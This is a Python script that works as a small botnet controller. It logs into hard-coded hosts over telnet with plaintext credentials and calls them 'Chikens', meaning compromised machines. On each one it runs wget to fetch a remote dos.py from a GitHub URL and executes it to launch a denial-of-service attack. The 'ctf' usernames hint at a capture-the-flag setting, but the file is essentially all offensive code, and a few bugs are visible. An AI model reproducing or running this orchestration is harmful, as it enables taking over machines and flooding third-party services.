import telnetlib
import time
import re
class Trigger(object):
    def __init__(self):
        pass

    def login(self,Hosts):
        ChickenNum = len(Hosts)
        print('total ctrled:',ChickenNum)
        devs = []
        for Chiken in Chikens:
            dev = telnetlib.Telnet(Chiken['host'], port=23)

            dev.read_until(b'login:')
            dev.write(Chiken['user'] + b'\n')

            dev.read_until(b'Password:')
            dev.write(Chiken['passwd'] + b'\n')
            dev.read_until(b'$')
            print("ctrled",str(Chiken['host'],encoding='utf-8'),"login success!")
            print("user:",str(Chiken['user'],encoding='utf-8'), "passwd:",str(Chiken['passwd'],encoding='utf-8'))
            devs.append(dev)
        return devs

    def dosDownLoad(self,devs,path):
        for dev in devs:
            dev.write(b'cd ~' + b'\n')

            dev.read_until(b'$')
            dev.write(b'wget -N '+ path + b'\n')
            dev.read_until(b'$')

    def dosAction(self,devs):
        i = 1
        for dev in devs:
            print('num ',i,' ctrled start action ..........................')
            dev.write(b'python3 dos.py' + b'\n')
            dev.read_until(b'$')
            i = i + 1

    def signout(self,devs):
        i = 1
        for dev in devs:
            telnetlib.Telnet.close(dev)
            print('num', i, ' ctrled log out.............................')
            i = 1 + 1

if __name__ == '__main__':

    Chikens = [{'host': b'153.0.0.171', 'user':b'ctf','passwd': b'ctff1234'},
            {'host':b'153.0.0.181','user':b'ctf','passwd':b'test1234'}]

    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/ddos/dos.py'

    hack = Trigger()
    devs = hack.login(Chikens)
    hack.dosDownLoad(devs,path)
    time.sleep(1)
    hack.dosAction(devs)
    hack.signout(devs)





